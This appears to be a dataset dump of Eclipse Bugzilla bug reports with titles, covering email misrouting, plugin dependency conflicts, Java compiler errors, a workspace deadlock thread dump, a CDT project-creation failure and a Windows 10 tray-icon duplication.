[Bug 118245] Allow bugzilla registered users to edit the wiki X-Bugzilla-Reason: CC In-Reply-To: <bug-118245-22269@https.bugs.eclipse.org/bugs/> To: ward.cunningham@eclipse.org From: bugzilla-daemon@eclipse.org Message-Id: <20060502193739.6C23A9A53B@build.eclipse.org> Date: Tue,  2 May 2006 15:37:39 -0400 (EDT) X-Sanitizer: Eclipse.org anomy configuration  https://bugs.eclipse.org/bugs/show_bug.cgi?id=118245  Product/Component: Community / Wiki      ------- Comment #30 from webmaster@eclipse.org  2006-05-02 15:38 ------- Need to test what happens when a Bugzilla user has an underscore character in the username.  Seems Wiki maps it to a space (and back) but fails the authentication in the interim.    --  Configure bugzilla e-mail: https://bugs.eclipse.org/bugs/userprefs.cgi?tab=email ------- You are receiving this mail because: ------- You are on the CC list for the bug, or are watching someone who is.  == == == == == == == == == == == == == == == == == == == ==  Ward did not receive this email (although he does receive other emails from Bugzilla).  == == == == == == == == == == == == == == == == == == == ==  This bug has the following emails: https://bugs.eclipse.org/bugs/show_bug.cgi?id=118245 assigned to: webmaster@eclipse.org reporter: bjorn@eclipse.org cc:      bradleyjames@gmail.com     djspiewak@gmail.com     donald@eclipse.org     gunnar@wagenknecht.org     ian.skerrett@eclipse.org     jcormier@acm.org     khalsted@ca.ibm.com     kowalski@us.ibm.com     kpeter@ca.ibm.com     markp@softlanding.com     mik.kersten@eclipse.org     mike.milinkovich@eclipse.org     neil.greenwood.lists@gmail.com     nick_edgar@ca.ibm.com     tlroche@us.ibm.com     ward.cunningham@eclipse.org  == == == == == == == == == == == == == == == == == == == ==  So:   1. I'm not bugzilla-watching Ward   2. This email is about a bug none of whose email addresses       are listed in my watch list   3. I'm correctly receiving bugzilla emails addressed to me   4. I'm incorrectly receiving bugzilla emails addressed to Ward",Receiving both my own and Ward's bugzilla emails
4104,Cannot complete the install because of a conflicting dependency.   Software being installed: JBossAS Tools 2.3.2.v20130112-0201-H153-Final (org.jboss.ide.eclipse.as.feature.feature.group 2.3.2.v20130112-0201-H153-Final)   Software currently installed: Eclipse IDE for Java EE Developers 1.2.2.20100217-2310 (epp.package.jee 1.2.2.20100217-2310)   Only one of the following can be installed at once:      Equinox Java Authentication and Authorization Service (JAAS) 1.1.1.R37x_v20110822-1018 (org.eclipse.equinox.security 1.1.1.R37x_v20110822-1018)     Equinox Java Authentication and Authorization Service (JAAS) 1.0.100.v20090520-1800 (org.eclipse.equinox.security 1.0.100.v20090520-1800)   Cannot satisfy dependency:     From: Eclipse IDE for Java EE Developers 1.2.2.20100217-2310 (epp.package.jee 1.2.2.20100217-2310)     To: org.eclipse.epp.package.jee.feature.feature.group [1.2.2.20100217-2310]   Cannot satisfy dependency:     From: Java EE IDE Feature 1.2.2.20100217-2310 (org.eclipse.epp.package.jee.feature.feature.group 1.2.2.20100217-2310)     To: org.eclipse.platform.feature.group [3.5.2.R35x_v20100210-0800-9hEiFzmFst-TiEn9hNYgDWg1XN8ulH_JvCNGB]   Cannot satisfy dependency:     From: Eclipse Platform 3.5.2.R35x_v20100210-0800-9hEiFzmFst-TiEn9hNYgDWg1XN8ulH_JvCNGB (org.eclipse.platform.feature.group 3.5.2.R35x_v20100210-0800-9hEiFzmFst-TiEn9hNYgDWg1XN8ulH_JvCNGB)     To: org.eclipse.equinox.security [1.0.100.v20090520-1800]   Cannot satisfy dependency:     From: JBoss AS Core Plug-in 2.3.2.v20130112-0201-H153-Final (org.jboss.ide.eclipse.as.core 2.3.2.v20130112-0201-H153-Final)     To: bundle org.eclipse.equinox.security 1.1.0   Cannot satisfy dependency:     From: JBossAS Tools 2.3.2.v20130112-0201-H153-Final (org.jboss.ide.eclipse.as.feature.feature.group 2.3.2.v20130112-0201-H153-Final)     To: org.jboss.ide.eclipse.as.core 2.3.0,Cannot complete the install because of a conflicting dependency.
4106,"The following code compiles in Java (and Maven and Idea) but not on Eclipse Luna/Mars :  public Map<String, CompletableFuture<List<Hotel>>> asyncLoadMany(List<String> codes, LocalDate begin, LocalDate end) {   return loadMany(codes, begin, end)     .entrySet()     .stream()     .collect(toMap(Map.Entry::getKey, entry -> completedFuture(entry.getValue()))); }  public Map<String, List<Hotel>> loadMany(List<String> codes, LocalDate begin, LocalDate end) {   return ...; }  The error is : Type mismatch: cannot convert from Map<Object,Object> to Map<String,CompletableFuture<List<Hotel>>>",[1.8] Unable to convert lambda
4211,"Build 20020319 org.eclipse.jdt.launching.j9 20020212  This version of the j9 launching plugin is out of date. When attempting to use  it, I get the following exceptions: Log: Thu Mar 21 10:41:46 CET 2002 4 org.eclipse.debug.ui 5013 Exception occurred while launching. java.lang.AbstractMethodError         at  org.eclipse.jdt.internal.launching.JavaLocalApplicationLaunchConfigurationDelega te.launch(JavaLocalApplicationLaunchConfigurationDelegate.java:88)         at org.eclipse.debug.internal.core.LaunchConfiguration.launch (LaunchConfiguration.java:137)         at  org.eclipse.debug.internal.ui.launchConfigurations.LaunchConfigurationDialog$8.r un(LaunchConfigurationDialog.java:1746)         at org.eclipse.jface.operation.ModalContext$ModalContextThread.run (ModalContext.java:98) Log: Thu Mar 21 11:19:08 CET 2002 4 org.eclipse.pde 0 Launch failed. See log for details. java.lang.NoSuchMethodError         at org.eclipse.jdt.internal.launching.j9.J9DebugVMRunner.run (J9DebugVMRunner.java:90)         at org.eclipse.pde.internal.launcher.WorkbenchLauncherDelegate.doLaunch (WorkbenchLauncherDelegate.java:131)         at  org.eclipse.pde.internal.launcher.WorkbenchLauncherWizard.delegateLaunch (WorkbenchLauncherWizard.java:129)         at org.eclipse.pde.internal.launcher.WorkbenchLauncherWizard.access$0 (WorkbenchLauncherWizard.java:116)         at org.eclipse.pde.internal.launcher.WorkbenchLauncherWizard$1.run (WorkbenchLauncherWizard.java:77)         at org.eclipse.jface.operation.ModalContext$ModalContextThread.run (ModalContext.java:98)",J9 plugin needs to be updated
4252,"For Bug 305037, a behavior change was implemented such that JDT will no longer resolve manifest classpath entries in jars returned by a classpath container. The classpath containers are now expected to resolve manifest classpath themselves if that is desirable.  The issue is not so much the design (whether the classpath container or JDT be responsible for manifest classpath resolution), but rather that this change in behavior affects existing container implementations written against Eclipse 3.5. This is not a theoretical problem. We came across this when debugging an issue in our product (Oracle Enterprise Pack for Eclipse). A classpath container that works on Eclipse 3.5 does not work on latest 3.6 builds.   There is also a side issue of impact on users as the result of this change impacting user libraries container. If a user has a workspace on Eclipse 3.5 and they define user libraries, they may intentionally or accidentally come to rely on manifest classpath resolution on those jars. Such a workspace when loaded in Eclipse 3.6 will not build. It will not be obvious to users what happened and what they need to correct (explicitly add jars pulled in via manifest classpath).  I would recommend trying to come up with a safer approach to solving the issue described in Bug 305037. If it is important to give more control over manifest classpath resolution to container then I would recommend adding new API that allows containers to opt-in for resolution suppression.",Breaking change in classpath container API
4293,"I got a deadlock while building my workspace.  I changed my task tags and issued a full rebuild.  I then made some changes in a file, and pressed ""Ctrl+S"" to save.  At this point, it seems to have locked up.  The UI thread is repainting, but no progress is being made.  The thread dump is as follows.  /opt/eclipse-I200601311200-gtk/eclipse -data /home/dpollock/Source/Eclipse/Workspaces/HEAD -vm /opt/sun-jdk-1.5.0.04/bin/java -vmargs -Xverify:none -Xms40m -Xmx128m -XX:PermSize=20m -XX:+UseParallelGC -XX:CompileThreshold=100 Full thread dump Java HotSpot(TM) Client VM (1.5.0_04-b05 mixed mode):  ""org.eclipse.jdt.internal.ui.text.JavaReconciler"" daemon prio=1 tid=0x092b9f08 nid=0x5fb3 in Object.wait() [0x9aa7a000..0x9aa7a170] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.jface.text.reconciler.AbstractReconciler$BackgroundThread.run(AbstractReconciler.java:176) 	- locked <0xae0bb038> (a org.eclipse.jface.text.reconciler.DirtyRegionQueue)  ""Worker-159"" prio=1 tid=0x9cb9f268 nid=0x5db6 in Object.wait() [0x9dcfe000..0x9dcff170] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.core.internal.jobs.ThreadJob.joinRun(ThreadJob.java:182) 	- locked <0xb1e69c38> (a org.eclipse.core.internal.jobs.ThreadJob) 	at org.eclipse.core.internal.jobs.ImplicitJobs.begin(ImplicitJobs.java:87) 	at org.eclipse.core.internal.jobs.JobManager.beginRule(JobManager.java:218) 	at org.eclipse.core.internal.utils.StringPoolJob.run(StringPoolJob.java:99) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:58)  ""Worker-153"" prio=1 tid=0x091b7ae8 nid=0x5da5 in Object.wait() [0x9e0ca000..0x9e0caef0] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.core.internal.jobs.ThreadJob.	at org.eclipse.core.launcher.Main.main(Main.java:952)  ""VM Thread"" prio=1 tid=0x080cf9b0 nid=0x340e runnable   ""GC task thread#0 (ParallelGC)"" prio=1 tid=0x080b54d8 nid=0x340c runnable   ""GC task thread#1 (ParallelGC)"" prio=1 tid=0x080b60d8 nid=0x340d runnable   ""VM Periodic Task Thread"" prio=1 tid=0xa640d1c8 nid=0x3414 waiting on condition   Full thread dump Java HotSpot(TM) Client VM (1.5.0_04-b05 mixed mode):  ""Worker-164"" prio=1 tid=0x9dd06438 nid=0x5ffa in Object.wait() [0x9b5fe000..0x9b5ff170] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.core.internal.jobs.WorkerPool.sleep(WorkerPool.java:173) 	- locked <0xaa8f4ec0> (a org.eclipse.core.internal.jobs.WorkerPool) 	at org.eclipse.core.internal.jobs.WorkerPool.startJob(WorkerPool.java:205) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:51)  ""Worker-163"" prio=1 tid=0x9a42eaa8 nid=0x5ff9 in Object.wait() [0x99ffc000..0x99ffd0f0] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.core.internal.jobs.WorkerPool.sleep(WorkerPool.java:173) 	- locked <0xaa8f4ec0> (a org.eclipse.core.internal.jobs.WorkerPool) 	at org.eclipse.core.internal.jobs.WorkerPool.startJob(WorkerPool.java:205) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:51)  ""org.eclipse.jdt.internal.ui.text.JavaReconciler"" daemon prio=1 tid=0x092b9f08 nid=0x5fb3 in Object.wait() [0x9aa7a000..0x9aa7a170] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.jface.text.reconciler.AbstractReconciler$BackgroundThread.run(AbstractReconciler.java:176) 	- locked <0xae0bb038> (a org.eclipse.jface.text.reconciler.DirtyRegionQueue)  ""Worker-159"" prio=1 tid=0x9cb9f268 nid=0x5db6 in Object.wait() [0x9dcfe000..0x9dcff170] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.core.internal.jobs.ThreadJob.joinRun(ThreadJob.java:182) 	- locked <0xb2185510> (a org.eclipse.core.internal.jobs.ThreadJob) 	at org.eclipse.core.internal.jobs.ImplicitJobs.begin(ImplicitJobs.java:87) 	at org.eclipse.core.internal.jobs.JobManager.beginRule(JobManager.java:218) 	at org.eclipse.core.internal.utils.StringPoolJob.run(StringPoolJob.java:99) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:58)  ""Worker-153"" prio=1 tid=0x091b7ae8 nid=0x5da5 in Object.wait() [0x9e0ca000..0x9e0caef0] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.core.internal.jobs.ThreadJob.joinRun(ThreadJob.java:182) 	- locked <0xae103ca0> (a org.eclipse.core.internal.jobs.ThreadJob) 	at org.eclipse.core.internal.jobs.ImplicitJobs.begin(ImplicitJobs.java:87) 	at org.eclipse.core.internal.jobs.JobManager.beginRule(JobManager.java:218) 	at org.eclipse.ui.internal.editors.quickdiff.LastSaveReferenceProvider.lockDocument(LastSaveReferenceProvider.java:290) 	at org.eclipse.ui.internal.editors.quickdiff.LastSaveReferenceProvider.readDocument(LastSaveReferenceProvider.java:242) 	at org.eclipse.ui.internal.editors.quickdiff.LastSaveReferenceProvider.getReference(LastSaveReferenceProvider.java:123) 	at org.eclipse.ui.internal.texteditor.quickdiff.DocumentLineDiffer$1.run(DocumentLineDiffer.java:462) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:58)  ""Worker-152"" prio=1 tid=0x093f5738 nid=0x5da4 in Object.wait() [0x9a3fe000..0x9a3fee70] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.core.internal.jobs.WorkerPool.sleep(WorkerPool.java:173) 	- locked <0xaa8f4ec0> (a org.eclipse.core.internal.jobs.WorkerPool) 	at org.eclipse.core.internal.jobs.WorkerPool.startJob(WorkerPool.java:205) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:51)  ""Worker-140"" prio=1 tid=0x094a1548 nid=0x5bee in Object.wait() [0x9d559000..0x9d55a170] 	at java.lang.Object.wait(Native Method) 	at java.lang.Object.wait(Object.java:474) 	at org.eclipse.debug.internal.ui.sourcelookup.Prompter.handleStatus(Prompter.java:67) 	- locked <0xb21855b8> (a org.eclipse.debug.internal.ui.sourcelookup.Prompter) 	at org.eclipse.debug.core.model.LaunchConfigurationDelegate.preLaunchCheck(LaunchConfigurationDelegate.java:204) 	at org.eclipse.debug.internal.core.LaunchConfiguration.launch(LaunchConfiguration.java:612) 	at org.eclipse.debug.internal.core.LaunchConfiguration.launch(LaunchConfiguration.java:570) 	at org.eclipse.debug.internal.core.LaunchConfiguration.launch(LaunchConfiguration.java:563) 	at org.eclipse.ui.externaltools.internal.model.ExternalToolBuilder.launchBuild(ExternalToolBuilder.java:176) 	at org.eclipse.ui.externaltools.internal.model.ExternalToolBuilder.doBuildBasedOnScope(ExternalToolBuilder.java:164) 	at org.eclipse.ui.externaltools.internal.model.ExternalToolBuilder.build(ExternalToolBuilder.java:83) 	at org.eclipse.core.internal.events.BuildManager$2.run(BuildManager.java:593) 	at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:37) 	at org.eclipse.core.runtime.Platform.run(Platform.java:804) 	at org.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:168) 	at org.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:202) 	at org.eclipse.core.internal.events.BuildManager$1.run(BuildManager.java:231) 	at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:37) 	at org.eclipse.core.runtime.Platform.run(Platform.java:804) 	at org.eclipse.core.internal.events.BuildManager.basicBuild(BuildManager.java:234) 	at org.eclipse.core.internal.events.BuildManager.basicBuildLoop(BuildManager.java:253) 	at org.eclipse.core.internal.events.BuildManager.build(BuildManager.java:282) 	at org.eclipse.core.internal.resources.Workspace.build(Workspace.java:271) 	at org.eclipse.jdt.internal.ui.util.CoreUtility$BuildJob.run(CoreUtility.java:146) 	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:58)  ""Java indexing"" daemon prio=1 tid=0x08b9b048 nid=0x3431 in Object.wait() [0x9fffe000..0x9fffeff0] 	at java.lang.Object.wait(Native Method) 	at java.lang.Object.wait(Object.java:474) 	at org.eclipse.jdt.internal.core.search.processing.JobManager.run(JobManager.java:349) 	- locked <0xab1fda08> (a org.eclipse.jdt.internal.core.search.indexing.IndexManager) 	at java.lang.Thread.run(Thread.java:595)  ""Start Level Event Dispatcher"" daemon prio=1 tid=0x083c6330 nid=0x341b in Object.wait() [0xa5e0c000..0xa5e0ce70] 	at java.lang.Object.wait(Native Method) 	- waiting on <0xaaa14350> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread) 	at java.lang.Object.wait(Object.java:474) 	at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.getNextEvent(EventManager.java:349) 	- locked <0xaaa14350> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread) 	at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.run(EventManager.java:287)  ""Framework Event Dispatcher"" daemon prio=1 tid=0x083c5b30 nid=0x341a in Object.wait() [0xa5e8e000..0xa5e8e1f0] 	at java.lang.Object.wait(Native Method) 	at java.lang.Object.wait(Object.java:474) 	at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.getNextEvent(EventManager.java:349) 	- locked <0xaaa12a10> (a org.eclipse.osgi.framework.eventmgr.EventManager$EventThread) 	at org.eclipse.osgi.framework.eventmgr.EventManager$EventThread.run(EventManager.java:287)  ""State Data Manager"" daemon prio=1 tid=0x083c4fa8 nid=0x3419 waiting on condition [0xa5f0f000..0xa5f0f170] 	at java.lang.Thread.sleep(Native Method) 	at org.eclipse.osgi.framework.adaptor.core.StateManager.run(StateManager.java:333) 	at java.lang.Thread.run(Thread.java:595)  ""Low Memory Detector"" daemon prio=1 tid=0xa640bb70 nid=0x3413 runnable [0x00000000..0x00000000]  ""CompilerThread0"" daemon prio=1 tid=0xa640a798 nid=0x3412 waiting on condition [0x00000000..0xa62fc958]  ""Signal Dispatcher"" daemon prio=1 tid=0xa6409928 nid=0x3411 waiting on condition [0x00000000..0x00000000]  ""Finalizer"" daemon prio=1 tid=0xa64004e0 nid=0x3410 in Object.wait() [0xa63fe000..0xa63fee70] 	at java.lang.Object.wait(Native Method) 	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:116) 	- locked <0xaa7dff58> (a java.lang.ref.ReferenceQueue$Lock) 	at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:132) 	at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:159)  ""Reference Handler"" daemon prio=1 tid=0x080d25d0 nid=0x340f in Object.wait() [0xa658f000..0xa658f1f0] 	at java.lang.Object.wait(Native Method) 	at java.lang.Object.wait(Object.java:474) 	at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:116) 	- locked <0xaa8ac020> (a java.lang.ref.Reference$Lock)  ""main"" prio=1 tid=0x0805bd38 nid=0x340b in Object.wait() [0xbff38000..0xbff3b938] 	at java.lang.Object.wait(Native Method) 	at org.eclipse.core.internal.jobs.ThreadJob.joinRun(ThreadJob.java:182) 	- locked <0xb2188000> (a org.eclipse.core.internal.jobs.ThreadJob) 	at org.eclipse.core.internal.jobs.ImplicitJobs.begin(ImplicitJobs.java:87) 	at org.eclipse.core.internal.jobs.JobManager.beginRule(JobManager.java:218) 	at org.eclipse.core.internal.resources.WorkManager.checkIn(WorkManager.java:96) 	at org.eclipse.core.internal.resources.Workspace.prepareOperation(Workspace.java:1681) 	at org.eclipse.core.internal.resources.Workspace.run(Workspace.java:1728) 	at org.eclipse.ui.actions.WorkspaceModifyOperation.run(WorkspaceModifyOperation.java:112) 	- locked <0xb2188070> (a org.eclipse.ui.actions.WorkspaceModifyDelegatingOperation) 	at org.eclipse.ui.internal.editors.text.WorkspaceOperationRunner.run(WorkspaceOperationRunner.java:73) 	at org.eclipse.ui.internal.editors.text.WorkspaceOperationRunner.run(WorkspaceOperationRunner.java:63) 	at org.eclipse.ui.editors.text.TextFileDocumentProvider.executeOperation(TextFileDocumentProvider.java:451) 	at org.eclipse.ui.editors.text.TextFileDocumentProvider.saveDocument(TextFileDocumentProvider.java:735) 	at org.eclipse.ui.texteditor.AbstractTextEditor.performSave(AbstractTextEditor.java:3798) 	at org.eclipse.jdt.internal.ui.javaeditor.CompilationUnitEditor.performSave(CompilationUnitEditor.java:1390) 	at org.eclipse.jdt.internal.ui.javaeditor.CompilationUnitEditor.doSave(CompilationUnitEditor.java:1443) 	- locked <0xae08f450> (a org.eclipse.jdt.internal.core.CompilationUnit) 	at org.eclipse.ui.internal.DefaultSaveableModel.doSave(DefaultSaveableModel.java:50) 	at org.eclipse.ui.internal.EditorManager$6.run(EditorManager.java:1218) 	at org.eclipse.ui.internal.SaveableHelper$4.run(SaveableHelper.java:234) 	at org.eclipse.jface.operation.ModalContext.runInCurrentThread(ModalContext.java:360) 	at org.eclipse.jface.operation.ModalContext.run(ModalContext.java:305) 	at org.eclipse.jface.window.ApplicationWindow$1.run(ApplicationWindow.java:631) 	at org.eclipse.swt.custom.BusyIndicator.showWhile(BusyIndicator.java:69) 	at org.eclipse.jface.window.ApplicationWindow.run(ApplicationWindow.java:628) 	at org.eclipse.ui.internal.WorkbenchWindow.run(WorkbenchWindow.java:2169) 	at org.eclipse.ui.internal.SaveableHelper.runProgressMonitorOperation(SaveableHelper.java:240) 	at org.eclipse.ui.internal.EditorManager.saveAll(EditorManager.java:1228) 	at org.eclipse.ui.internal.Workbench$11.run(Workbench.java:683) 	at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:37) 	at org.eclipse.core.runtime.Platform.run(Platform.java:804) 	at org.eclipse.ui.internal.Workbench.saveAllEditors(Workbench.java:646) 	at org.eclipse.debug.internal.ui.DebugUIPlugin.saveAllEditors(DebugUIPlugin.java:533) 	at org.eclipse.debug.internal.ui.DebugUIPlugin.preLaunchSave(DebugUIPlugin.java:731) 	at org.eclipse.debug.internal.ui.launchConfigurations.SaveScopeResourcesHandler.handleStatus(SaveScopeResourcesHandler.java:92) 	at org.eclipse.debug.internal.ui.sourcelookup.Prompter$1.run(Prompter.java:55) 	at org.eclipse.swt.widgets.RunnableLock.run(RunnableLock.java:35) 	at org.eclipse.swt.widgets.Synchronizer.runAsyncMessages(Synchronizer.java:123) 	- locked <0xb2188218> (a org.eclipse.swt.widgets.RunnableLock) 	at org.eclipse.swt.widgets.Display.runAsyncMessages(Display.java:3051) 	at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:2755) 	at org.eclipse.ui.internal.dialogs.EventLoopProgressMonitor.runEventLoop(EventLoopProgressMonitor.java:123) 	at org.eclipse.ui.internal.dialogs.EventLoopProgressMonitor.isCanceled(EventLoopProgressMonitor.java:97) 	at org.eclipse.core.internal.jobs.ThreadJob.isCanceled(ThreadJob.java:126) 	at org.eclipse.core.internal.jobs.ThreadJob.joinRun(ThreadJob.java:161) 	at org.eclipse.core.internal.jobs.ImplicitJobs.begin(ImplicitJobs.java:87) 	at org.eclipse.core.internal.jobs.JobManager.beginRule(JobManager.java:218) 	at org.eclipse.core.internal.resources.WorkManager.checkIn(WorkManager.java:96) 	at org.eclipse.core.internal.resources.Workspace.prepareOperation(Workspace.java:1681) 	at org.eclipse.core.internal.resources.Workspace.run(Workspace.java:1728) 	at org.eclipse.ui.actions.WorkspaceModifyOperation.run(WorkspaceModifyOperation.java:112) 	- locked <0xae276218> (a org.eclipse.ui.actions.WorkspaceModifyDelegatingOperation) 	at org.eclipse.ui.internal.editors.text.WorkspaceOperationRunner.run(WorkspaceOperationRunner.java:73) 	at org.eclipse.ui.internal.editors.text.WorkspaceOperationRunner.run(WorkspaceOperationRunner.java:63) 	at org.eclipse.ui.editors.text.TextFileDocumentProvider.executeOperation(TextFileDocumentProvider.java:451) 	at org.eclipse.ui.editors.text.TextFileDocumentProvider.saveDocument(TextFileDocumentProvider.java:735) 	at org.eclipse.ui.texteditor.AbstractTextEditor.performSave(AbstractTextEditor.java:3798) 	at org.eclipse.jdt.internal.ui.javaeditor.CompilationUnitEditor.performSave(CompilationUnitEditor.java:1390) 	at org.eclipse.jdt.internal.ui.javaeditor.CompilationUnitEditor.doSave(CompilationUnitEditor.java:1443) 	- locked <0xae08f450> (a org.eclipse.jdt.internal.core.CompilationUnit) 	at org.eclipse.ui.internal.SaveableHelper$1.run(SaveableHelper.java:128) 	at org.eclipse.ui.internal.SaveableHelper$4.run(SaveableHelper.java:234) 	at org.eclipse.jface.operation.ModalContext.runInCurrentThread(ModalContext.java:360) 	at org.eclipse.jface.operation.ModalContext.run(ModalContext.java:305) 	at org.eclipse.jface.window.ApplicationWindow$1.run(ApplicationWindow.java:631) 	at org.eclipse.swt.custom.BusyIndicator.showWhile(BusyIndicator.java:69) 	at org.eclipse.jface.window.ApplicationWindow.run(ApplicationWindow.java:628) 	at org.eclipse.ui.internal.WorkbenchWindow.run(WorkbenchWindow.java:2169) 	at org.eclipse.ui.internal.SaveableHelper.runProgressMonitorOperation(SaveableHelper.java:240) 	at org.eclipse.ui.internal.SaveableHelper.savePart(SaveableHelper.java:133) 	at org.eclipse.ui.internal.EditorManager.savePart(EditorManager.java:1328) 	at org.eclipse.ui.internal.WorkbenchPage.savePart(WorkbenchPage.java:2750) 	at org.eclipse.ui.internal.WorkbenchPage.saveEditor(WorkbenchPage.java:2763) 	at org.eclipse.ui.internal.SaveAction.run(SaveAction.java:67) 	at org.eclipse.jface.action.Action.runWithEvent(Action.java:492) 	at org.eclipse.jface.commands.ActionHandler.execute(ActionHandler.java:117) 	at org.eclipse.core.commands.Command.executeWithChecks(Command.java:384) 	at org.eclipse.core.commands.ParameterizedCommand.executeWithChecks(ParameterizedCommand.java:420) 	at org.eclipse.ui.internal.handlers.HandlerService.executeCommand(HandlerService.java:159) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.executeCommand(WorkbenchKeyboard.java:466) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.press(WorkbenchKeyboard.java:794) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.processKeyEvent(WorkbenchKeyboard.java:841) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.filterKeySequenceBindings(WorkbenchKeyboard.java:563) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard.access$3(WorkbenchKeyboard.java:506) 	at org.eclipse.ui.internal.keys.WorkbenchKeyboard$KeyDownFilter.handleEvent(WorkbenchKeyboard.java:122) 	at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:66) 	at org.eclipse.swt.widgets.Display.filterEvent(Display.java:1251) 	at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1062) 	at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1087) 	at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1072) 	at org.eclipse.swt.widgets.Widget.sendKeyEvent(Widget.java:1099) 	at org.eclipse.swt.widgets.Widget.gtk_key_press_event(Widget.java:649) 	at org.eclipse.swt.widgets.Control.gtk_key_press_event(Control.java:2043) 	at org.eclipse.swt.widgets.Composite.gtk_key_press_event(Composite.java:608) 	at org.eclipse.swt.widgets.Widget.windowProc(Widget.java:1412) 	at org.eclipse.swt.widgets.Display.windowProc(Display.java:3717) 	at org.eclipse.swt.internal.gtk.OS._gtk_main_do_event(Native Method) 	at org.eclipse.swt.internal.gtk.OS.gtk_main_do_event(OS.java:5074) 	at org.eclipse.swt.widgets.Display.eventProc(Display.java:1066) 	at  org.eclipse.swt.internal.gtk.OS.g_main_context_iteration(OS.java:1354) 	at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:2750) 	at org.eclipse.ui.internal.Workbench.runEventLoop(Workbench.java:1792) 	at org.eclipse.ui.internal.Workbench.runUI(Workbench.java:1756) 	at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:401) 	at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:143) 	at org.eclipse.ui.internal.ide.IDEApplication.run(IDEApplication.java:106) 	at org.eclipse.core.internal.runtime.PlatformActivator$1.run(PlatformActivator.java:109) 	at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:93) 	at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:69) 	at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:374) 	at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:169) 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 	at java.lang.reflect.Method.invoke(Method.java:585) 	at org.eclipse.core.launcher.Main.invokeFramework(Main.java:338) 	at org.eclipse.core.launcher.Main.basicRun(Main.java:282) 	at org.eclipse.core.launcher.Main.run(Main.java:977)",Deadlock while building
4296,"Steps to reproduce: * Start the 'New C Project' wizard. * Type in a name and leave 'Static Library' and 'Cygwin GCC' selected. * Select 'Finish'  ==> Lot's of 'storage file not found' are logged. A window with title 'Internal Error' and content 'Internal Error:' pops up. The wizard must be cancelled, no project was created.  I used the debugger to find the point where the creation fails. It is caused by a NPE, see the attachement.",[Project Model] cannot create c-project
4303,"Created attachment 260002 sample plugin  The issue was reported by some IBM Sametime customers. They said the Sametime icon in system tray was duplicated many times. After checking the issue, I think it's a generic issue of SWT Tray component. I reported the bug as critical because our Sametime customer requests urgent fix from us.  The customer is using Windows 10. They have told me the following cases that they see multiple icons:  1. Close the lid and reopen it; 2. Change the screen resolution or scale factor.  I personally can't reproduce the issue with first approach. But I am able to regularly reproduce the bug by changing scale factor in Display setting. In Windows 10, you can set scale factor in ""Settings"" -> ""Display"" -> ""Change the size of text, apps, and other items"". Slide the bar to set a different scale factor which is greater than 100%. Do not log out. You will see an existing tray icon is duplicated by itself. Each time when you change to a new scale factor, a new copy of the icon will be created. These icons will not disappear if you hover the mouse upon them. They stay in the system tray till the application quits. But they are not operational at all, irresponsible to your click or right click.  I created a sample plugin to demonstrate the issue. The plugin can be launched in Eclipse IDE. I tried with Eclipse 3.7.2 and the latest Eclipse 4.5.2. Both versions have the same issue. The 3.7.2 is what Sametime based on and the target for this ticket.",[Windows 10] Tray item icon is duplicated in some conditions
4320,"Using HEAD,  interface I {     int CONST = A.foo(); }  class A { 	static int foo() {         System.out.println(""SUCCESS"");         return 0;     } } class B implements I {     B() {         int i = CONST;     } } public class X {     public static void main(String[] args) {     	new B();     } }  Compiling this code with optimizing out unused locals ends up with no call for the CONST field inside the constructor of B. -preserveAllLocals should not change the behavior of the code. The code seems to be in SingleNameReference. I'll attach a patch.",[compiler] Unused locals initialisation is optimized out when it is a single name reference
